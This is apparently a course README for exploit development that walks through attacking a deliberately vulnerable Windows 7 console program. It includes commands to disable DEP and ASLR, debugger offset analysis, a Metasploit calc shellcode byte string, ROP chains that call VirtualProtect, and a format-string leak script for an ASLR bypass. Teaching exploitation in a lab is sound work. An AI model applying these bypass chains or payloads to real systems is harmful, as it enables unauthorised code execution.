// Settings

:doctype: article
:hyphens:
:icons: font
:lang: en
:listing-caption: Listing
:sectnums:
:source-highlighter: pygments
:xrefstyle: short

// Links

:url-win-7-sha1-values: https://answers.microsoft.com/en-us/windows/forum/windows_7-windows_install/how-to-obtain-a-windows-7-iso-file-to-create-an/59ef6586-f881-40b7-9070-e7950e057143
:url-win-7-x86: https://archive.org/details/Windows_7_Professional_SP1_x86.iso
:url-win-7-x64: https://archive.org/details/Windows_7_Professional_SP1_x64.iso

// Content

== Introduction

This repository provides a stack overflow vulnerable application and exploit demonstration. The content is prepared for ZEIT8042 - Introduction to Exploit Development course in UNSW Canberra.

The application developed has multiple vulnerabilities to exploit such as stack overflow and format string bugs. The exploit provided exploits the stack overflow with DEP and ASLR bypasses.

The contents of the repository is listed in <<tab-layout>>.

[#tab-layout]
[cols="<20%,<80%", options="header"]
.Directory layout for submission.
|===
| Directory| Contents

| `/app`
| Source code for a vulnerable application.

| `/exploit`
| Python scripts to demonstrate exploitation of the application.
|===



[#sec-mitigations]
== Mitigations

=== Data Execution Prevention (DEP)
Data Execution Prevention (DEP) is designed to prevent code exection on memory pages unless they're explicitly marked as executable.
More details about the DEP is available at https://msrc-blog.microsoft.com/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.

The following command disables DEP on Windows 7 SP1 permanently. It can be used to disable DEP for simple exploit development exercises or trainings such as EIP exploitation with `jmp esp`.

`bcdedit.exe /set nx AlwaysOff`

The following command enables DEP on Windows 7 SP1  permanently for all applications. 

`bcdedit.exe /set nx AlwaysOn`

=== Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (ASLR) is designed to prevent code exploitation attempts with hard-coded memory addresses and pointers. It simply randomises the executables' base address, and the position of the heap, stack and libraries in a process' address space. 

For simple exploit development exercises or training, the ASLR can be disabled on Windows 7 SP1 with following steps.

Open the following registry key.

`[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]`

Create a `dword` value named `MoveImages` with value of `00000000`

To enable ASLR, simply delete the `MoveImages`.


[#sec-application]
== Application

=== Dependencies

The application is a simple and standalone application, no external library required.

The operating system target is Windows 7 Service Pack 1 X64. 

The application is compiled in 32 bit with exploit mitigations. 

However, Windows 7 version or exploit mitigations may not make too much difference as the final exploit has ASLR bypass with Return Oriented Programming (ROP). So the exploit calculates the memory addresses using relative distances of the memory leakage, and then utilise ROP to bypass DEP mitigation. 


=== Compiling

The application can be complied using Embercadero C++Compiler (https://www.embarcadero.com/free-tools/ccompiler).

The following command can compile the application. 

`bcc32c.exe -w-all -o stackvulnerable-console.exe stackvulnerable-console.c`

There is also a `Makefile.bcc32` provided which can run as follows to compile the application as well.

`make -f Makefile.bcc32`

=== Programming Errors

The application has various programming bugs allowing users to develop various exploit types.

* Format string bugs such as `strcpy(fname,argv[1]);`. This allows attackers to execute code or leak memory addresses to bypass ASLR.
* Stack overflow bugs such as `strcpy(data,buff);`. This allows attackers to execute code with EIP or SEH exploits.

=== Execution

The application accepts an argument which is a file name pointing a file to read. 

`stackvulnerable-console.exe console.txt`

When the application runs without an argument, it asks a file name from the user to read the data.

```
stackvulnerable-console.exe

File name to read?
testfile
testfileFile does not exist!
File name to read?
```

[#sec-exploit]
== Exploit

=== Building Up an EIP Exploit

==== Disabling the Exploit Mitigations

DEP and ASLR can be disabled to start with EIP exploitation with no mitigations. To do that, the instructions above should run and the target os should be restarted.

==== Analysis of the Memory Corruption

File: consoleexploit-EIP.py 

The following assessment steps help to identify the alignment after the stack overflow occured.

* Enable a breakpoint on `0x004012AF` to observe the `POP EBP # RET` failure.
* Use padding for 1500 chars and put in the console.txt and observe the memory corruption.
* Use `!mona pc 1500` for pattern creation, then use `!mona findmsp` to see the memory alignment.
```
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)
```
* It's time for choosing EIP exploit or SEH. This example is based on EIP exploitation instead of SEH exploitation, so 1200 characters would be sufficient and keep SEH intact.

==== Analysis of the Memory Alignment

File: consoleexploit-EIP.py 

After the memory corruption analysis, the following alignment would be observed. 

`PADDING(A*1032) + EBP(BBBB) + EIP(CCCC) + ESP(D*168) => 1208`

* Using Mona, `JMP ESP` can be assemblied as `!mona asm -s "JMP ESP"`
* Using Mona, a `JMP ESP` can be found in a module using `!mona find -s "\xff\xe4"`. If possible find it in a Non-ASLR, Non-Rebase and Non-SafeSEH module. 
```
0x7de9d07b (b+0x0002d07b)  : "\xff\xe4" |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7600.16385 (C:\Windows\SysWOW64\ntdll.dll)
```
* The `0x7de9d07b` can be used in EIP as `eip = struct.pack('L',0x7de9d07b)`

* As the ESP points out the `ESP(D*168)` container in the structure, after the `JMP ESP`, `"\xcc" * 168` can be used to provide breakpoints to see whether we controlled the execution.

```
# padding for 1032
padding = "A"*1032
# required to trigger the corruption
ebp = "BBBB"
# JMP ESP  0x7de9d07b in ntdll
eip = struct.pack('L',0x7de9d07b)
# code execution with \xCC (Breakpoint)
esp = "\xcc" * 168
```
==== Analysis of the Memory Alignment

File: consoleexploit-EIP-JumpBack-NoShellcode.py

After quick look at the structure, it should be observed that the `padding` container has more space for the shellcode, but it's also before the `ESP` which has space only for 168. Therefore, it's required to jump back from the `ESP` to the `padding` which will host the payload/shellcode. The following steps would help us to jump back.

* First we need to find the distance between `ESP` address and `padding` address (0x0018fb0c) which is 1040 (410) for the relative jump.

* Subtract 1040 from the `ESP`, then jumping to `ESP` is the next action. The assembly instructions for this jump are "add esp,-410 # jmp esp". Mona can convert the assembly instructions to opcode. 

```
!mona asm -s "add esp,-410 # jmp esp"
Full opcode : \x81\xc4\xf0\xfb\xff\xff\xff\xe4
```

* This shellcode can be added before the esp container and the length could be subtracted from 168. 
```
jmpback = "\x81\xc4\xf0\xfb\xff\xff\xff\xe4"
esp = jmpback + "\xcc" * (168 - len(jmpback))
```

* Finally we need to convert the `padding` from `A` to `\xcc` (breakpoint) to confirm the the code execution.

==== Executing the Shellcode

File: consoleexploit-EIP-Shellcode.py

Mona `bytearray` and `compare` help to identify the bad characters which may terminate the payload. The followings are identified as bad characters, so should be avoided for payload generation.

`\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28`

Metasploit Framework can be used to generate the 32 bit `exec` payload such as `calc` with bad characters as below. 

```
# Shellcode 32-bit Run Calc
buf = "\x90" * 8
buf += b"\xdb\xd4\xbe\x5e\x2d\x0e\x1f\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x30\x31\x77\x18\x03\x77\x18\x83\xc7\x5a\xcf"
buf += b"\xfb\xe3\x8a\x8d\x04\x1c\x4a\xf2\x8d\xf9\x7b\x32\xe9"
buf += b"\x8a\x2b\x82\x79\xde\xc7\x69\x2f\xcb\x5c\x1f\xf8\xfc"
buf += b"\xd5\xaa\xde\x33\xe6\x87\x23\x55\x64\xda\x77\xb5\x55"
buf += b"\x15\x8a\xb4\x92\x48\x67\xe4\x4b\x06\xda\x19\xf8\x52"
buf += b"\xe7\x92\xb2\x73\x6f\x46\x02\x75\x5e\xd9\x19\x2c\x40"
buf += b"\xdb\xce\x44\xc9\xc3\x13\x60\x83\x78\xe7\x1e\x12\xa9"
buf += b"\x36\xde\xb9\x94\xf7\x2d\xc3\xd1\x3f\xce\xb6\x2b\x3c"
buf += b"\x73\xc1\xef\x3f\xaf\x44\xf4\xe7\x24\xfe\xd0\x16\xe8"
buf += b"\x99\x93\x14\x45\xed\xfc\x38\x58\x22\x77\x44\xd1\xc5"
buf += b"\x58\xcd\xa1\xe1\x7c\x96\x72\x8b\x25\x72\xd4\xb4\x36"
buf += b"\xdd\x89\x10\x3c\xf3\xde\x28\x1f\x99\x21\xbe\x25\xef"
buf += b"\x22\xc0\x25\x5f\x4b\xf1\xae\x30\x0c\x0e\x65\x75\xe2"
buf += b"\x44\x24\xdf\x6b\x01\xbc\x62\xf6\xb2\x6a\xa0\x0f\x31"
buf += b"\x9f\x58\xf4\x29\xea\x5d\xb0\xed\x06\x2f\xa9\x9b\x28"
buf += b"\x9c\xca\x89\x4a\x43\x59\x51\x8d"
```

=== Exploit 1 - DEP Bypass 

File: consoleexploit-DEP.py

DEP can be enabled for this exploit demonstration using the following command.

`bcdedit.exe /set nx AlwaysOn`

When the DEP gets enabled, 2 challenges emerge:

* The `ESP` doesn't have executable permissions and jump back shellcode doesn't work. The solution for the `ESP` execution is finding ROP gadgets to subtract 1040 (410) then jump to the new address. 

* The `padding` (payload location) doesn't have executable permissions to run the shellcode either. So, the payload location needs a permission fix (RWX) get code execution as the shellcode needs to unpack in memory and run. If the jump back is successful, a ROP chain would run before the memory permissions get fixed, and call `kernel32.VirtualProtect` to fix the permissions for the shellcode following.

As a result, 2 separate ROP chains should be developed. The first can be only a couple of gadgets as it's a stack adjustment. The second ROP chain would be generated using Mona.

In addition, the execution will need to start with `EIP` controlled, so no need for `JMP ESP` as the first ROP chain will start running to jump back. 

To reach the objective;

* Using mona for the rop generation using kernel32.dll and ntdll.dll `!mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -m ntdll.dll,kernel32.dll`

* `POP ECX # RETN` is used to load `0xfffffbe8`, it's negative as subtraction has bad characters such as \x00. The plan is using `ADD ESP,ECX # POP EBP # RETN 0x04` to subtract it (adding a negative number) from the `ESP` and jump to it. The distance is adjusted due to the `ROP RETN 0x04` 

```
0x7dde87ea,  # POP ECX # RETN    ** [kernel32.dll] **   
0xfffffbe8,  # 0018FF24 (ESP) + fffffbe8 = 0018FB0C (Payload)
0x7df3f8c3,  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] ** 
```

* The second ROP chain can be generated using mona as it's already generated in the ropchain.txt. The following register alignment is required to call `kernel32.VirtualProtect` to change the memory location's permissions.
```
# Register setup for VirtualProtect() :
# --------------------------------------------
# EAX = NOP (0x90909090)
# ECX = lpOldProtect (ptr to W address)
# EDX = NewProtect (0x40)
# EBX = dwSize
# ESP = lPAddress (automatic)
# EBP = ReturnTo (ptr to jmp esp)
# ESI = ptr to VirtualProtect()
# EDI = ROP NOP (RETN)
```

* However, the ROP chain generated by mona has missing steps. `EBX` isn't calculated due to ROPs not found. `EBX` is required to give the size of the memory area which will receive the new permissions. 

* After a careful analysis in the rop.txt file of mona, the following gadgets were found. Simply using `POP EAX # RETN` for `0xfffffbdb`, then using `NEG EAX # POP EBP # RETN 0x04` gives `0x00000425` which is a reasonable length for the shellcode.  

* A number of fillers were used due to `RETN 0x10`.

* It also gives a chance to place the `kernel32.VirtualProtect` pointer to the `ESI` directly. Therefore, `ESI` calculation of mona is unnecessary as it can be placed here. 

* Custom ROP fix also uses `EBP`, so it overwrites the `EBP` calculation of mona if this block placed after it. It's a good practice to place custom ROP fixes before the auto generated ROP chains.

```
#[---INFO:gadgets_to_set_ebx and esi---] // Manual Fix
# 0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
0x7ddff385,  # POP EAX # RETN [kernel32.dll] ** ASLR 
0x41414141,  # Filler (compensate)
0xfffffbdb,  # Value to negate, will become 0x00000425 
0x7de0bc6f,  # NEG EAX # POP EBP # RETN 0x04    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
0x41414141,  # Filler (compensate)
0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   
0x48414141,  # Filler (compensate)
0x43414141,  # Filler (compensate)
0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   
0x44414141,  # Filler (compensate)
0x47414141,  # Filler (compensate)
0x45414141,  # Filler (compensate)
0x46414141,  # Filler (compensate)
# This goes to ESI
0x7DD743CE,  # ptr to kernel32.VirtualProtect

```

=== Exploit 2 - ASLR Bypass

File: consoleexploit-ASLR.py

When the ASLR and DEP both were enabled, the address space randomisation causes additional errors. The reason is all addresses used for ROP gadgets are hardcoded addresses and they change in every restart.

This can be solved in various ways such as partial overwrite (simply relying on an existig pointer and calculating distance using it), using non-ASLR compiled modules or brute force.

In this example, ASLR will be bypassed using another vulnerability in the application which is a format string bug. The application accepts the file name, but also prints it before loading the file.

As seen in the example, %x can be used as input to leak data and memory addresses. 

```
stackvulnerable-console.exe

File name to read?
%x %x %x
0 fc0000fc 0File does not exist!
File name to read?
%x %x %x %x %x
18fb0c 1 c 18fb0c 14File does not exist!
File name to read?
%x %x %x %x %x %x %x
18fb0c 1 14 18fb0c 14 9 7dea4315File does not exist!
File name to read?
%x %x %x %x %x %x %x %x
18fb0c 1 20 18fb0c 14 9 7dea4315 4a2060File does not exist!
File name to read?
```

This variable is used as input to gather the `ntdll.dll` and `kernel32.dll` address to calculate rop gadgets' current memory locations using relative addresses.
leaktrigger = "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21 + "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21

The following code segment simply gives the leak trigger as argument to the applications, and parses the result which contains the memory addresses. 

```
leaktrigger = "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21 + "%x\n"*6 + "ntdll%xntdll" + "%x\n"*60+"kernel32%xkernel32" + "%x\n"*21

p = subprocess.Popen(['stackvulnerable-console.exe',leaktrigger],
				stdin=subprocess.PIPE,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				universal_newlines=True)

(stdoutdata, stderrdata) = p.communicate()

ntdllleak=int(stdoutdata.split("ntdll")[1],16)
kernel32leak=int(stdoutdata.split("kernel32")[1],16)

print("Ntdll Leak: "+hex(ntdllleak)+"\nKernel32 Leak: "+hex(kernel32leak))
```

As seen in the following output, `ntdll.dll` and `kernel32.dll` memory addresses are disclosed. 

```
Ntdll Leak: 0x7dea4315
Kernel32 Leak: 0x7dd7264a
[+] Creating console.txt
[+] Writing 1204 bytes to file
[+] Done
```

While base addresses of `kernel32.dll` and `ntdll.dll` are randomised, their content will still align same due to their DLL structure. So, calculating each ROP gadget's distance to the leaked DLL base address would give a "relative address" for it. The following alignment shows that even though the base address changes, the distance of the function will remain same to the base address.

`LIBRARY-----11-----FUNCTION1----8---FUNCTION2---7---FUNCTION3`
`BASEADDRESS-----11-----FUNCTION1----8---FUNCTION2---7---FUNCTION3`

As a result, the relative address should be like `BASE+0x000ABCDE`. Therefore, changing all hardcoded memory addresses in the DEP exploit to relative addresses will make the exploit dynamic. 

Finally, when the exploit gets constructed, the exploit will get the leaked memory addresses first to calculate the memory addresses for ROP,and prepare the output file which will execute the shellcode.




